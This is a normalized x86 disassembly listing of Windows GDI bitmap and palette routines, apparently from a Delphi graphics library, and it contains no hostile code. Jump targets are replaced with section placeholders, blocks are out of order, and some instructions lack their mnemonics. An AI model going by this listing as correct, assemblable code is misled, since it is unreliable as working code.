mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_42697c
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_427600
call sub_42697c
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4280a0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bd73
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_428148
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_42bd42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_428148
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4027d4
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_42697c
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_427600
call sub_42697c
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_42697c
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_427600
call sub_42697c
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_428148
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403c08
call sub_403c08
jmp r-xdata
sub_42bd95
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_42bda4
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_403b84
call sub_403bd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_42be04
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_42be68
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_42b35c
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42c063
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_428148
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_428148
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_428148
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42c01b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_42b7a0
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_42c074
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4292c8
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_42b5cc
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_42c0dc
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
call sub_42c7ec
mov eax [ esi + 0x28 ]
call sub_42b5d0
mov eax [ esi + 0x2c ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41bc24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_42c118
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_42c1d0
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402da4
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42ca5c
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_42b5cc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_42b5d0
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41bc50
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_42c208
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42c7ec
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42c297
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_42be04
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_42b7a0
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42ca5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42c29c
mov eax [ ebp - 0x8 ]
call sub_4260ac
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403b84
call sub_403bd8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_42c2c8
push ebx
mov ebx eax
mov eax ebx
call sub_42c5bc
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d7a0
pop ebx
retn
sub_42c2f8
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41dc28
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_42c7ec
lea eax [ ebx + 0x2c ]
call sub_40d7a0
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42ca5c
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_42c36c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_427e24
mov eax ebx
call sub_42c8fc
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_42c6f8
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_42c5a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_427d50
push eax
call SetStretchBltMode
mov eax ebx
call sub_42c63c
mov dl [ r-xdata ]
call sub_427e24
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_42c89c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_42c63c
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c5af
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42c53d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_428148
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_42c63c
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4282ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_42c5bc
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_42c7fc
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_42c208
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_4280a0
sub_42c63c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_42c7fc
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b3d8
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_42c2c8
sub_42c684
push ebx
mov ebx eax
mov eax ebx
call sub_42c7ec
mov eax ebx
call sub_42c7fc
mov edx ebx
mov eax ebx
call sub_42c2c8
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_42c6a8
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_42c728
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_42697c
mov eax ebx
call sub_42c6f8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_42c63c
xor edx edx
pop ecx
call sub_427cdc
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_42c778
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_42c8fc
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_42b7a0
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_42c7fc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41dbc4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_42c87f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_42c89c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_42c7ec
mov eax ebx
call sub_42c7fc
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_42c728
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_42be68
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_42b35c
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_42c8fc
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_428838
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_42b35c
push 0x0
call GetDC
call sub_428148
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_42c9b4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_428010
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_42c208
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_42c7ec
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402da4
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_42ca38
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41dba4
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_42d0ec
pop esi
pop ebx
retn
sub_42ca5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42cae3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403540
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_42cb43
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_42b5d0
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_42b5cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cb4a
push rw-data
call LeaveCriticalSection
retn
sub_42cb5c
push ebx
push esi
push edi
push ecx
mov esi edx
